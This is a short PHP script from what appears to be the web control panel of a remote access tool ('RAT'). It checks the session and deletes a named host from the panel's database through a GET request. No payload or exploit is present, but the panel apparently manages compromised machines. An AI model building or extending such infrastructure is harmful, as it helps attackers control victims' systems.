<?php
  # Necessary at the top of every page for session management
  session_start();

  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));

    $hostname = $_GET["hostname"]; # hostname to be deleted

    # Deletes hostname from "host" table
    $statement = $dbConnection->prepare("DELETE FROM hosts WHERE hostname = :hostname");
    $statement->bindValue(":hostname", $hostname);
    $statement->execute();

    # Kills database connection
    $statement->connection = null;

    # Redirects the user back to hosts.php
    header("Location: hosts.php");
  }
?>
